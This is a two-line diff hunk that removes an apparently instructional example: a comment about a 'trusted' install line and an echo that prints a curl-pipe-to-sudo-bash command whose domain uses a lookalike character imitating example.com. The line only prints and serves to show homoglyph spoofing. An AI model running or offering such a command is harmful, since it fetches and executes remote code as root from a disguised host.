@@ -1,2 +1,0 @@
-# a "trusted" install line - notice the domain (safe here, it only echoes):
-echo "curl -fsSL https://exаmple.com/get.sh | sudo bash"
